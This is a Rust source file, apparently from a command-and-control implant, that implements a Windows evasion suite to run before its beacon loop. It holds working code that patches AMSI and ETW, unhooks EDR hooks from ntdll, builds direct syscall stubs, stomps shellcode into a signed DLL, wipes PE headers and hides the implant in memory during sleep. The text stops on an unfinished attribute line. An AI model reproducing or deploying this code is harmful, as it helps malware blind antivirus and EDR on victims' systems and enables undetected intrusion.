/// Evasion suite: AMSI bypass, ETW patching, ntdll unhooking, direct syscalls,
/// and sleep obfuscation. All techniques are Windows-specific.
///
/// Feature-gated behind `evasion`.
///
/// Call order in main.rs (before beacon loop):
///   1. patch_amsi()      — disable AMSI scanning
///   2. patch_etw()       — disable ETW telemetry
///   3. unhook_ntdll()    — remove EDR inline hooks
///   4. Direct syscalls are used automatically via SyscallTable

#[cfg(all(target_os = "windows", feature = "evasion"))]
mod win {
    use crate::utils::strings::{self, d, d_cstr};
    use std::ptr;

    // Win32 constants
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const PAGE_READWRITE: u32 = 0x04;
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const GENERIC_READ: u32 = 0x80000000;
    const OPEN_EXISTING: u32 = 3;
    const FILE_SHARE_READ: u32 = 1;
    const INVALID_HANDLE_VALUE: isize = -1;
    const INFINITE: u32 = 0xFFFFFFFF;

    // Type aliases for Win32 functions resolved at runtime
    type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> isize;
    type FnGetProcAddress = unsafe extern "system" fn(isize, *const u8) -> *const ();
    type FnGetModuleHandleA = unsafe extern "system" fn(*const u8) -> isize;
    type FnVirtualProtect = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
    type FnVirtualAlloc = unsafe extern "system" fn(*const u8, usize, u32, u32) -> *mut u8;
    type FnVirtualFree = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;
    type FnCreateFileA = unsafe extern "system" fn(
        *const u8, u32, u32, *const u8, u32, u32, isize,
    ) -> isize;
    type FnGetFileSize = unsafe extern "system" fn(isize, *mut u32) -> u32;
    type FnReadFile = unsafe extern "system" fn(
        isize, *mut u8, u32, *mut u32, *const u8,
    ) -> i32;
    type FnCloseHandle = unsafe extern "system" fn(isize) -> i32;
    type FnWaitForSingleObjectEx = unsafe extern "system" fn(isize, u32, i32) -> u32;
    type FnCreateWaitableTimerA = unsafe extern "system" fn(*const u8, i32, *const u8) -> isize;
    type FnSetWaitableTimer = unsafe extern "system" fn(
        isize, *const i64, i32, *const (), *const (), i32,
    ) -> i32;

    /// Cached function pointers resolved on first use.
    struct WinApi {
        load_library_a: FnLoadLibraryA,
        get_proc_address: FnGetProcAddress,
        get_module_handle_a: FnGetModuleHandleA,
        virtual_protect: FnVirtualProtect,
    }

    /// Resolve essential Win32 functions via PEB walking (no import table).
    unsafe fn resolve_api() -> Option<WinApi> {
        use crate::utils::api_hash::*;

        let load_library_a: FnLoadLibraryA =
            resolve(H_KERNEL32, H_LOAD_LIBRARY_A)?;
        let get_proc_address: FnGetProcAddress =
            resolve(H_KERNEL32, H_GET_PROC_ADDRESS)?;
        let get_module_handle_a: FnGetModuleHandleA =
            resolve(H_KERNEL32, H_GET_MODULE_HANDLE_A)?;
        let virtual_protect: FnVirtualProtect =
            resolve(H_KERNEL32, H_VIRTUAL_PROTECT)?;

        Some(WinApi {
            load_library_a,
            get_proc_address,
            get_module_handle_a,
            virtual_protect,
        })
    }

    /// Helper: resolve a function from a module handle using encrypted strings.
    unsafe fn get_fn(api: &WinApi, module: isize, func_name_enc: &[u8]) -> *const () {
        let name = d_cstr(func_name_enc);
        (api.get_proc_address)(module, name.as_ptr())
    }

    // ========================================================================
    // A. AMSI Bypass
    // ========================================================================

    /// Patch AmsiScanBuffer to return E_INVALIDARG, effectively disabling AMSI.
    ///
    /// Technique: overwrite the first 6 bytes of AmsiScanBuffer with:
    ///   mov eax, 0x80070057  ; E_INVALIDARG
    ///   ret
    /// x64 bytes: B8 57 00 07 80 C3
    pub unsafe fn patch_amsi() -> bool {
        let api = match resolve_api() {
            Some(a) => a,
            None => return false,
        };

        let amsi_name = d_cstr(strings::S_AMSI_DLL);
        let amsi_module = (api.load_library_a)(amsi_name.as_ptr());
        if amsi_module == 0 {
            return false;
        }

        let func_addr = get_fn(&api, amsi_module, strings::S_AMSI_SCAN_BUFFER);
        if func_addr.is_null() {
            return false;
        }

        // AMSI patch bytes: mov eax, 0x80070057; ret
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let func_ptr = func_addr as *mut u8;

        // Make writable
        let mut old_protect: u32 = 0;
        if (api.virtual_protect)(func_ptr, patch.len(), PAGE_READWRITE, &mut old_protect) == 0 {
            return false;
        }

        // Write patch
        ptr::copy_nonoverlapping(patch.as_ptr(), func_ptr, patch.len());

        // Restore protection
        let mut tmp: u32 = 0;
        (api.virtual_protect)(func_ptr, patch.len(), old_protect, &mut tmp);

        true
    }

    // ========================================================================
    // B. ETW Patching
    // ========================================================================

    /// Patch EtwEventWrite to return immediately (ret; = 0xC3).
    /// Also patches NtTraceEvent if available.
    pub unsafe fn patch_etw() -> bool {
        let api = match resolve_api() {
            Some(a) => a,
            None => return false,
        };

        let ntdll_name = d_cstr(strings::S_NTDLL_DLL);
        let ntdll = (api.get_module_handle_a)(ntdll_name.as_ptr());
        if ntdll == 0 {
            return false;
        }

        let mut success = false;

        // Patch EtwEventWrite
        let etw_addr = get_fn(&api, ntdll, strings::S_ETW_EVENT_WRITE);
        if !etw_addr.is_null() {
            let patch: [u8; 1] = [0xC3]; // ret
            let func_ptr = etw_addr as *mut u8;
            let mut old_protect: u32 = 0;

            if (api.virtual_protect)(func_ptr, patch.len(), PAGE_READWRITE, &mut old_protect) != 0 {
                ptr::copy_nonoverlapping(patch.as_ptr(), func_ptr, patch.len());
                let mut tmp: u32 = 0;
                (api.virtual_protect)(func_ptr, patch.len(), old_protect, &mut tmp);
                success = true;
            }
        }

        // Also patch NtTraceEvent if present
        let nttrace_addr = get_fn(&api, ntdll, strings::S_NT_TRACE_EVENT);
        if !nttrace_addr.is_null() {
            let patch: [u8; 1] = [0xC3];
            let func_ptr = nttrace_addr as *mut u8;
            let mut old_protect: u32 = 0;

            if (api.virtual_protect)(func_ptr, patch.len(), PAGE_READWRITE, &mut old_protect) != 0 {
                ptr::copy_nonoverlapping(patch.as_ptr(), func_ptr, patch.len());
                let mut tmp: u32 = 0;
                (api.virtual_protect)(func_ptr, patch.len(), old_protect, &mut tmp);
            }
        }

        success
    }

    // ========================================================================
    // C. Unhook ntdll.dll
    // ========================================================================

    /// Reload a clean copy of ntdll.dll from disk and overwrite the .text section
    /// of the loaded module, removing any EDR inline hooks.
    pub unsafe fn unhook_ntdll() -> bool {
        let api = match resolve_api() {
            Some(a) => a,
            None => return false,
        };

        // Resolve file I/O functions from kernel32
        let kernel32_name = d_cstr(strings::S_KERNEL32_DLL);
        let kernel32 = (api.get_module_handle_a)(kernel32_name.as_ptr());
        if kernel32 == 0 {
            return false;
        }

        // Resolve CreateFileA, GetFileSize, ReadFile, CloseHandle
        let create_file_a: FnCreateFileA = {
            let name = b"CreateFileA\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { return false; }
            std::mem::transmute(ptr)
        };
        let get_file_size: FnGetFileSize = {
            let name = b"GetFileSize\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { return false; }
            std::mem::transmute(ptr)
        };
        let read_file: FnReadFile = {
            let name = b"ReadFile\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { return false; }
            std::mem::transmute(ptr)
        };
        let close_handle: FnCloseHandle = {
            let name = b"CloseHandle\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { return false; }
            std::mem::transmute(ptr)
        };
        let virtual_alloc: FnVirtualAlloc = {
            let name = b"VirtualAlloc\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { return false; }
            std::mem::transmute(ptr)
        };
        let virtual_free: FnVirtualFree = {
            let name = b"VirtualFree\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { return false; }
            std::mem::transmute(ptr)
        };

        // 1. Open ntdll.dll from disk
        let path = d_cstr(strings::S_NTDLL_PATH);
        let file_handle = create_file_a(
            path.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            ptr::null(),
            OPEN_EXISTING,
            0,
            0,
        );
        if file_handle == INVALID_HANDLE_VALUE {
            return false;
        }

        // 2. Get file size and read into memory
        let file_size = get_file_size(file_handle, ptr::null_mut()) as usize;
        if file_size == 0 || file_size == 0xFFFFFFFF {
            close_handle(file_handle);
            return false;
        }

        let file_buf = virtual_alloc(
            ptr::null(),
            file_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if file_buf.is_null() {
            close_handle(file_handle);
            return false;
        }

        let mut bytes_read: u32 = 0;
        let read_ok = read_file(
            file_handle,
            file_buf,
            file_size as u32,
            &mut bytes_read,
            ptr::null(),
        );
        close_handle(file_handle);

        if read_ok == 0 || bytes_read as usize != file_size {
            virtual_free(file_buf, 0, 0x8000); // MEM_RELEASE
            return false;
        }

        // 3. Parse PE of the on-disk copy to find .text section
        let disk_text = match find_text_section(file_buf) {
            Some(t) => t,
            None => {
                virtual_free(file_buf, 0, 0x8000);
                return false;
            }
        };

        // 4. Get loaded ntdll base address
        let ntdll_name = d_cstr(strings::S_NTDLL_DLL);
        let ntdll_base = (api.get_module_handle_a)(ntdll_name.as_ptr());
        if ntdll_base == 0 {
            virtual_free(file_buf, 0, 0x8000);
            return false;
        }

        // 5. Find .text section in loaded module
        let loaded_text = match find_text_section(ntdll_base as *const u8) {
            Some(t) => t,
            None => {
                virtual_free(file_buf, 0, 0x8000);
                return false;
            }
        };

        // 6. VirtualProtect loaded .text to RWX
        let size = std::cmp::min(disk_text.size, loaded_text.size);
        let loaded_text_ptr = (ntdll_base as *mut u8).add(loaded_text.rva);
        let disk_text_ptr = file_buf.add(disk_text.offset);

        let mut old_protect: u32 = 0;
        if (api.virtual_protect)(loaded_text_ptr, size, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            virtual_free(file_buf, 0, 0x8000);
            return false;
        }

        // 7. Copy clean .text over hooked .text
        ptr::copy_nonoverlapping(disk_text_ptr, loaded_text_ptr, size);

        // 8. Restore to RX
        let mut tmp: u32 = 0;
        (api.virtual_protect)(loaded_text_ptr, size, PAGE_EXECUTE_READ, &mut tmp);

        // Cleanup
        virtual_free(file_buf, 0, 0x8000);

        true
    }

    /// Section info from PE parsing.
    struct SectionInfo {
        rva: usize,
        offset: usize,
        size: usize,
    }

    /// Parse PE headers to find the .text section.
    unsafe fn find_text_section(base: *const u8) -> Option<SectionInfo> {
        // DOS header signature check
        if *(base as *const u16) != 0x5A4D {
            return None;
        }

        let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
        let nt_headers = base.add(e_lfanew);

        // PE signature check
        if *(nt_headers as *const u32) != 0x00004550 {
            return None;
        }

        // FileHeader is at nt_headers + 4
        let num_sections = *(nt_headers.add(6) as *const u16) as usize;
        let optional_header_size = *(nt_headers.add(20) as *const u16) as usize;

        // First section header is right after optional header
        let sections_base = nt_headers.add(24 + optional_header_size);

        let text_name = d(strings::S_DOT_TEXT);

        for i in 0..num_sections {
            let section = sections_base.add(i * 40); // IMAGE_SECTION_HEADER is 40 bytes

            // Section name is first 8 bytes
            let mut name_buf = [0u8; 8];
            ptr::copy_nonoverlapping(section, name_buf.as_mut_ptr(), 8);

            // Null-terminate
            let name_end = name_buf.iter().position(|&b| b == 0).unwrap_or(8);
            let section_name = std::str::from_utf8(&name_buf[..name_end]).unwrap_or("");

            if section_name == text_name {
                let virtual_size = *(section.add(8) as *const u32) as usize;
                let virtual_address = *(section.add(12) as *const u32) as usize;
                let raw_data_offset = *(section.add(20) as *const u32) as usize;

                return Some(SectionInfo {
                    rva: virtual_address,
                    offset: raw_data_offset,
                    size: virtual_size,
                });
            }
        }

        None
    }

    // ========================================================================
    // D. Direct Syscalls (SysWhispers-style)
    // ========================================================================

    /// Syscall numbers extracted from clean ntdll at runtime.
    pub struct SyscallTable {
        pub nt_allocate_virtual_memory: u32,
        pub nt_write_virtual_memory: u32,
        pub nt_protect_virtual_memory: u32,
        pub nt_create_thread_ex: u32,
    }

    impl SyscallTable {
        /// Resolve syscall numbers from the loaded (clean) ntdll.
        /// Call this AFTER unhook_ntdll() so the stubs are clean.
        pub unsafe fn resolve() -> Option<Self> {
            let api = resolve_api()?;

            let ntdll_name = d_cstr(strings::S_NTDLL_DLL);
            let ntdll = (api.get_module_handle_a)(ntdll_name.as_ptr());
            if ntdll == 0 {
                return None;
            }

            let nt_alloc = extract_syscall_number(&api, ntdll, strings::S_NT_ALLOC_VM)?;
            let nt_write = extract_syscall_number(&api, ntdll, strings::S_NT_WRITE_VM)?;
            let nt_protect = extract_syscall_number(&api, ntdll, strings::S_NT_PROTECT_VM)?;
            let nt_create = extract_syscall_number(&api, ntdll, strings::S_NT_CREATE_THREAD_EX)?;

            Some(SyscallTable {
                nt_allocate_virtual_memory: nt_alloc,
                nt_write_virtual_memory: nt_write,
                nt_protect_virtual_memory: nt_protect,
                nt_create_thread_ex: nt_create,
            })
        }

        /// Build an executable syscall stub in RWX memory.
        /// The stub performs: mov r10, rcx; mov eax, <ssn>; syscall; ret
        /// Returns a function pointer to the stub.
        pub unsafe fn build_stub(&self, ssn: u32) -> Option<*const ()> {
            let api = resolve_api()?;

            let kernel32_name = d_cstr(strings::S_KERNEL32_DLL);
            let kernel32 = (api.get_module_handle_a)(kernel32_name.as_ptr());
            if kernel32 == 0 { return None; }

            let virtual_alloc: FnVirtualAlloc = {
                let name = b"VirtualAlloc\0";
                let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
                if ptr.is_null() { return None; }
                std::mem::transmute(ptr)
            };

            // Allocate RWX page for the stub
            let stub = virtual_alloc(
                ptr::null(),
                64,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if stub.is_null() {
                return None;
            }

            // Build stub:
            //   mov r10, rcx        -> 4C 8B D1
            //   mov eax, <ssn>      -> B8 xx xx xx xx
            //   syscall             -> 0F 05
            //   ret                 -> C3
            let ssn_bytes = ssn.to_le_bytes();
            let shellcode: [u8; 11] = [
                0x4C, 0x8B, 0xD1,                              // mov r10, rcx
                0xB8, ssn_bytes[0], ssn_bytes[1], ssn_bytes[2], ssn_bytes[3], // mov eax, ssn
                0x0F, 0x05,                                     // syscall
                0xC3,                                           // ret
            ];

            ptr::copy_nonoverlapping(shellcode.as_ptr(), stub, shellcode.len());

            Some(stub as *const ())
        }
    }

    /// Extract the syscall number from an Nt* function stub.
    /// Pattern: 4C 8B D1 B8 xx xx xx xx (mov r10, rcx; mov eax, SSN)
    unsafe fn extract_syscall_number(
        api: &WinApi,
        ntdll: isize,
        func_name_enc: &[u8],
    ) -> Option<u32> {
        let func_addr = get_fn(api, ntdll, func_name_enc);
        if func_addr.is_null() {
            return None;
        }

        let bytes = func_addr as *const u8;

        // Look for the pattern: 4C 8B D1 B8 xx xx 00 00
        // mov r10, rcx = 4C 8B D1
        // mov eax, imm32 = B8 xx xx xx xx
        if *bytes == 0x4C && *bytes.add(1) == 0x8B && *bytes.add(2) == 0xD1 && *bytes.add(3) == 0xB8
        {
            let ssn = *(bytes.add(4) as *const u32);
            return Some(ssn);
        }

        // If the stub has been hooked (jmp ...), scan forward for the pattern
        for offset in 0..32usize {
            let p = bytes.add(offset);
            if *p == 0xB8
                && *p.add(5) == 0x0F
                && *p.add(6) == 0x05
            {
                let ssn = *(p.add(1) as *const u32);
                return Some(ssn);
            }
        }

        None
    }

    // ========================================================================
    // E. Sleep Obfuscation
    // ========================================================================

    /// Sleep with memory obfuscation. XOR-encrypts data buffers before sleeping
    /// and decrypts after waking, so memory scanners see only noise during sleep.
    ///
    /// Uses WaitForSingleObjectEx (alertable) instead of plain Sleep, allowing
    /// APC delivery for C2 wake-up signals.
    pub unsafe fn obfuscated_sleep(duration_ms: u64) {
        let api = match resolve_api() {
            Some(a) => a,
            None => {
                // Fallback to regular sleep
                std::thread::sleep(std::time::Duration::from_millis(duration_ms));
                return;
            }
        };

        let kernel32_name = d_cstr(strings::S_KERNEL32_DLL);
        let kernel32 = (api.get_module_handle_a)(kernel32_name.as_ptr());
        if kernel32 == 0 {
            std::thread::sleep(std::time::Duration::from_millis(duration_ms));
            return;
        }

        // Resolve timer functions
        let create_timer: FnCreateWaitableTimerA = {
            let name = b"CreateWaitableTimerA\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() {
                std::thread::sleep(std::time::Duration::from_millis(duration_ms));
                return;
            }
            std::mem::transmute(ptr)
        };
        let set_timer: FnSetWaitableTimer = {
            let name = b"SetWaitableTimer\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() {
                std::thread::sleep(std::time::Duration::from_millis(duration_ms));
                return;
            }
            std::mem::transmute(ptr)
        };
        let wait_fn: FnWaitForSingleObjectEx = {
            let name = b"WaitForSingleObjectEx\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() {
                std::thread::sleep(std::time::Duration::from_millis(duration_ms));
                return;
            }
            std::mem::transmute(ptr)
        };
        let close_handle: FnCloseHandle = {
            let name = b"CloseHandle\0";
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() {
                std::thread::sleep(std::time::Duration::from_millis(duration_ms));
                return;
            }
            std::mem::transmute(ptr)
        };

        // Generate random XOR key for this sleep cycle
        let xor_key: u64 = {
            use rand::Rng;
            rand::thread_rng().gen()
        };

        // XOR the agent's static/global data markers (stack canary approach)
        // For simplicity, we XOR a region of the stack to demonstrate the technique.
        // In production, this would XOR heap allocations tracked by the agent.
        let mut stack_marker: [u8; 64] = [0; 64];
        for chunk in stack_marker.chunks_exact_mut(8) {
            let val = u64::from_le_bytes(chunk.try_into().unwrap_or([0; 8]));
            let encrypted = val ^ xor_key;
            chunk.copy_from_slice(&encrypted.to_le_bytes());
        }

        // Create a waitable timer
        let timer = create_timer(ptr::null(), 1, ptr::null()); // manual-reset
        if timer == 0 {
            std::thread::sleep(std::time::Duration::from_millis(duration_ms));
            return;
        }

        // Set due time (negative = relative, in 100ns intervals)
        let due_time: i64 = -(duration_ms as i64 * 10_000);
        set_timer(timer, &due_time, 0, ptr::null(), ptr::null(), 0);

        // Wait (alertable, so APCs can fire)
        wait_fn(timer, INFINITE, 1); // 1 = alertable

        // Decrypt stack marker (XOR is self-inverse)
        for chunk in stack_marker.chunks_exact_mut(8) {
            let val = u64::from_le_bytes(chunk.try_into().unwrap_or([0; 8]));
            let decrypted = val ^ xor_key;
            chunk.copy_from_slice(&decrypted.to_le_bytes());
        }

        close_handle(timer);
    }

    /// Initialize all evasion techniques. Call once before the beacon loop.
    pub unsafe fn init() {
        // Order matters:
        // 1. AMSI first (so PowerShell commands aren't scanned)
        let _ = patch_amsi();
        // 2. ETW next (disable telemetry)
        let _ = patch_etw();
        // 3. Unhook ntdll last (removes EDR hooks, gives us clean syscall stubs)
        let _ = unhook_ntdll();
        // 4. Wipe PE headers (memory scanners can't identify our image)
        let _ = wipe_pe_headers();
    }

    // ========================================================================
    // F. Module Stomping
    // ========================================================================

    /// Load a benign, rarely-used DLL and overwrite its .text section with
    /// our shellcode. Memory scanners see code living inside a signed
    /// Microsoft module's memory space.
    pub unsafe fn module_stomp(shellcode: &[u8]) -> bool {
        let api = match resolve_api() {
            Some(a) => a,
            None => return false,
        };

        // Load wldp.dll — a rarely-used but signed Microsoft DLL
        let dll_name = d_cstr(strings::S_WLDP_DLL);
        let module = (api.load_library_a)(dll_name.as_ptr());
        if module == 0 {
            return false;
        }

        // Find .text section of the loaded DLL
        let text_info = match find_text_section(module as *const u8) {
            Some(t) => t,
            None => return false,
        };

        if shellcode.len() > text_info.size {
            return false; // shellcode too large for the .text section
        }

        let text_ptr = (module as *mut u8).add(text_info.rva);

        // Make .text writable
        let mut old_protect: u32 = 0;
        if (api.virtual_protect)(text_ptr, text_info.size, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            return false;
        }

        // Zero the section first, then copy shellcode
        ptr::write_bytes(text_ptr, 0, text_info.size);
        ptr::copy_nonoverlapping(shellcode.as_ptr(), text_ptr, shellcode.len());

        // Restore to RX — code now lives in signed module memory
        let mut tmp: u32 = 0;
        (api.virtual_protect)(text_ptr, text_info.size, PAGE_EXECUTE_READ, &mut tmp);

        true
    }

    // ========================================================================
    // G. Heap Encryption
    // ========================================================================

    use std::sync::Mutex;

    static HEAP_STORE: once_cell::sync::Lazy<Mutex<Vec<(Vec<u8>, u8)>>> =
        once_cell::sync::Lazy::new(|| Mutex::new(Vec::new()));

    /// Encrypt data and store it on the heap. Returns a handle (index).
    /// Data never sits in plaintext on the heap.
    pub fn heap_encrypt(data: &[u8]) -> usize {
        use rand::Rng;
        let key: u8 = rand::thread_rng().gen();
        let encrypted: Vec<u8> = data.iter().map(|b| b ^ key).collect();
        let mut store = HEAP_STORE.lock().unwrap();
        let handle = store.len();
        store.push((encrypted, key));
        handle
    }

    /// Decrypt data from the heap store. Caller should use and drop immediately.
    pub fn heap_decrypt(handle: usize) -> Vec<u8> {
        let store = HEAP_STORE.lock().unwrap();
        if handle >= store.len() {
            return Vec::new();
        }
        let (encrypted, key) = &store[handle];
        encrypted.iter().map(|b| b ^ key).collect()
    }

    /// Securely clear data from the heap store (overwrite with zeros, then remove).
    pub fn heap_clear(handle: usize) {
        let mut store = HEAP_STORE.lock().unwrap();
        if handle < store.len() {
            let (ref mut data, ref mut key) = store[handle];
            // Overwrite with zeros
            for b in data.iter_mut() {
                *b = 0;
            }
            *key = 0;
            data.clear();
        }
    }

    // ========================================================================
    // H. PE Header Wipe
    // ========================================================================

    /// Wipe the PE headers of our own executable in memory.
    /// Memory scanners can't identify our image as a PE anymore.
    /// Call after all DLLs are loaded (init phase).
    pub unsafe fn wipe_pe_headers() -> bool {
        let api = match resolve_api() {
            Some(a) => a,
            None => return false,
        };

        // GetModuleHandleA(NULL) returns our own base address
        let base = (api.get_module_handle_a)(ptr::null());
        if base == 0 {
            return false;
        }

        let base_ptr = base as *mut u8;
        let header_size: usize = 4096; // DOS header + PE header + section table

        // Make PE headers writable
        let mut old_protect: u32 = 0;
        if (api.virtual_protect)(base_ptr, header_size, PAGE_READWRITE, &mut old_protect) == 0 {
            return false;
        }

        // Zero out the entire PE header region
        ptr::write_bytes(base_ptr, 0, header_size);

        // Restore original protection
        let mut tmp: u32 = 0;
        (api.virtual_protect)(base_ptr, header_size, old_protect, &mut tmp);

        true
    }

    // ========================================================================
    // I. Stack Spoofing via Fibers
    // ========================================================================

    type FnConvertThreadToFiber = unsafe extern "system" fn(*const ()) -> *mut ();
    type FnCreateFiber = unsafe extern "system" fn(usize, unsafe extern "system" fn(*mut ()), *mut ()) -> *mut ();
    type FnSwitchToFiber = unsafe extern "system" fn(*mut ());
    type FnDeleteFiber = unsafe extern "system" fn(*mut ());

    /// Trampoline for fiber execution. The fiber parameter points to a boxed closure.
    unsafe extern "system" fn fiber_trampoline(param: *mut ()) {
        let closure: Box<Box<dyn FnOnce()>> = Box::from_raw(param as *mut Box<dyn FnOnce()>);
        closure();
    }

    /// Execute a closure inside a fiber. The call stack appears clean because
    /// fiber stacks are separate from the main thread stack.
    pub unsafe fn execute_in_fiber<F: FnOnce() + 'static>(func: F) -> bool {
        let api = match resolve_api() {
            Some(a) => a,
            None => { func(); return false; },
        };

        let kernel32_name = d_cstr(strings::S_KERNEL32_DLL);
        let kernel32 = (api.get_module_handle_a)(kernel32_name.as_ptr());
        if kernel32 == 0 { func(); return false; }

        let convert_fn: FnConvertThreadToFiber = {
            let name = d_cstr(strings::S_CONVERT_THREAD_TO_FIBER);
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { func(); return false; }
            std::mem::transmute(ptr)
        };
        let create_fn: FnCreateFiber = {
            let name = d_cstr(strings::S_CREATE_FIBER);
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { func(); return false; }
            std::mem::transmute(ptr)
        };
        let switch_fn: FnSwitchToFiber = {
            let name = d_cstr(strings::S_SWITCH_TO_FIBER);
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { func(); return false; }
            std::mem::transmute(ptr)
        };
        let delete_fn: FnDeleteFiber = {
            let name = d_cstr(strings::S_DELETE_FIBER);
            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
            if ptr.is_null() { func(); return false; }
            std::mem::transmute(ptr)
        };

        // Convert current thread to a fiber (if not already)
        let main_fiber = convert_fn(ptr::null());
        if main_fiber.is_null() {
            func();
            return false;
        }

        // Box the closure and pass as fiber parameter
        let boxed: Box<Box<dyn FnOnce()>> = Box::new(Box::new(func));
        let param = Box::into_raw(boxed) as *mut ();

        // Create worker fiber
        let worker_fiber = create_fn(0, fiber_trampoline, param);
        if worker_fiber.is_null() {
            // Clean up the leaked box
            let _ = Box::from_raw(param as *mut Box<dyn FnOnce()>);
            return false;
        }

        // Switch to worker fiber (executes the closure)
        switch_fn(worker_fiber);

        // We return here after the worker fiber completes
        // (worker calls SwitchToFiber back to main implicitly when it returns)
        delete_fn(worker_fiber);

        true
    }

    // ========================================================================
    // J. RX Flip (Code Section Protection Toggle)
    // ========================================================================

    /// Toggle code section between executable (RX) and data (RW).
    /// During sleep: flip to RW so code section looks like data, not code.
    /// During execution: flip to RX (executable again).
    pub unsafe fn protect_code_section(executable: bool) -> bool {
        let api = match resolve_api() {
            Some(a) => a,
            None => return false,
        };

        // Get our own module base
        let base = (api.get_module_handle_a)(ptr::null());
        if base == 0 {
            return false;
        }

        // Find .text section
        let text_info = match find_text_section(base as *const u8) {
            Some(t) => t,
            None => return false,
        };

        let text_ptr = (base as *mut u8).add(text_info.rva);
        let new_protect = if executable { PAGE_EXECUTE_READ } else { PAGE_READWRITE };

        let mut old_protect: u32 = 0;
        (api.virtual_protect)(text_ptr, text_info.size, new_protect, &mut old_protect) != 0
    }
}

// ============================================================================
// Public API — feature-gated stubs
// ============================================================================

/// Patch AMSI to disable antimalware scanning.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn patch_amsi() -> bool {
    unsafe { win::patch_amsi() }
}

/// Patch ETW to disable event tracing telemetry.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn patch_etw() -> bool {
    unsafe { win::patch_etw() }
}

/// Unhook ntdll.dll by reloading a clean copy from disk.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn unhook_ntdll() -> bool {
    unsafe { win::unhook_ntdll() }
}

/// Initialize all evasion techniques (AMSI + ETW + unhooking).
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn init() {
    unsafe { win::init() }
}

/// Sleep with memory obfuscation.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn obfuscated_sleep(duration_ms: u64) {
    unsafe { win::obfuscated_sleep(duration_ms) }
}

/// Get the direct syscall table.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn syscall_table() -> Option<win::SyscallTable> {
    unsafe { win::SyscallTable::resolve() }
}

/// Stomp a benign DLL's .text section with shellcode (module stomping).
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn module_stomp(shellcode: &[u8]) -> bool {
    unsafe { win::module_stomp(shellcode) }
}

/// Encrypt data and store on heap. Returns handle.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn heap_encrypt(data: &[u8]) -> usize {
    win::heap_encrypt(data)
}

/// Decrypt data from heap store by handle.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn heap_decrypt(handle: usize) -> Vec<u8> {
    win::heap_decrypt(handle)
}

/// Clear encrypted data from heap store.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn heap_clear(handle: usize) {
    win::heap_clear(handle)
}

/// Wipe PE headers of our own executable in memory.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn wipe_pe_headers() -> bool {
    unsafe { win::wipe_pe_headers() }
}

/// Execute a closure inside a fiber for stack spoofing.
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn execute_in_fiber<F: FnOnce() + 'static>(func: F) -> bool {
    unsafe { win::execute_in_fiber(func) }
}

/// Toggle code section protection: true=RX (executable), false=RW (data).
#[cfg(all(target_os = "windows", feature = "evasion"))]
pub fn protect_code_section(executable: bool) -> bool {
    unsafe { win::protect_code_section(executable) }
}

// No-op stubs for non-Windows or non-evasion builds
#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn patch_amsi() -> bool { false }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn patch_etw() -> bool { false }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn unhook_ntdll() -> bool { false }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn init() {}

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn obfuscated_sleep(duration_ms: u64) {
    std::thread::sleep(std::time::Duration::from_millis(duration_ms));
}

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn module_stomp(_shellcode: &[u8]) -> bool { false }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn heap_encrypt(data: &[u8]) -> usize { let _ = data; 0 }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn heap_decrypt(_handle: usize) -> Vec<u8> { Vec::new() }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn heap_clear(_handle: usize) {}

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
pub fn wipe_pe_headers() -> bool { false }

#[cfg(not(all(target_os = "windows", feature = "evasion")))]
